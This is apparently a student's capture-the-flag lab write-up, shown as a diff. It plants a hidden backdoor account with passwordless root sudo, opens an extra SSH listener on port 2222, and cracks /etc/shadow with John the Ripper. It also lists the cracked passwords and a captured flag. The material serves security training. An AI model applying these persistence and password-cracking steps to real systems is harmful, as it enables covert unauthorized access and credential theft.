@@ -1,0 +1,87 @@
+Step 1: Shadow People
+Create a secret user named sysd. Make sure this user doesn't have a home folder created:
+
+
+adduser sysd --no-create-home
+(assign password, leave name and additional info blank)
+Give your secret user a password:
+
+
+Surprise! The password = password (this is part of the adduser step above, must be entered twice to verify) 
+Give your secret user a system UID < 1000:
+
+
+usermod -u 666 sysd
+Give your secret user the same GID:
+
+
+groupmod -g 666 sysd
+id sysd (verifies the changes above were made)
+Give your secret user full sudo access without the need for a password:
+
+
+visudo (go to the bottom of the script and add user with the following:) 
+sysd ALL=(ALL:ALL) NOPASSWD:ALL
+Test that sudo access works without your password:
+su sysd (no password was required so this was successful)
+Logged in as user sysd run: sudo -l 
+User sysd may run the following commands on scavenger-hunt: (ALL : ALL) NOPASSWD: ALL (this confirms sysd has sudo privileges)
+
+ Your bash commands here:
+sysd ALL=(ALL:ALL) NOPASSWD:ALL
+Step 2: Smooth Sailing
+Edit the sshd_config file:
+	(still signed in as user sysd - must log back into root using sudo su) 
+		cd /etc/ssh
+		nano sshd_config
+		add Port 2222 (see below in bash)
+		netstat -tulpn | grep LISTEN (view current)
+		
+
+ Your bash commands here
+Under #Port 22 input 
+Port 2222 (make sure it is uncommented)
+
+
+Step 3: Testing Your Configuration Update
+Restart the SSH service:
+
+
+Your solution command here
+systemctl restart ssh
+netstat -tulpn | grep LISTEN
+Exit the root account:
+
+
+Your solution command here
+exit (in this case 2x’s to returns to sysd)
+SSH to the target machine using your sysd account and port 2222:
+
+
+Your solution command here
+ifconfig (shows active)
+ssh sysd@192.168.6.105 -p 2222
+iIfconfig (to confirm)
+uptime (to confirm)
+Use sudo to switch to the root user:
+
+
+Your solution command here
+sudo su 
+Step 4: Crack All the Passwords
+SSH back to the system using your sysd account and port 2222:
+
+
+Your solution command here
+ssh sysd@192.168.6.105 -p 2222
+ifconfig (to confirm) 
+Uptime (to confirm)
+2.   Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+
+
+Your solution command here
+As root user: john /etc/shadow
+Was able to log in to target box as sysadmin with sudo privileges using password: passw0rd and capture the flag: You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
+
+I tested the cracked passwords directly on the target machine as well which was successful: 
+User login: stallman Password: computer 
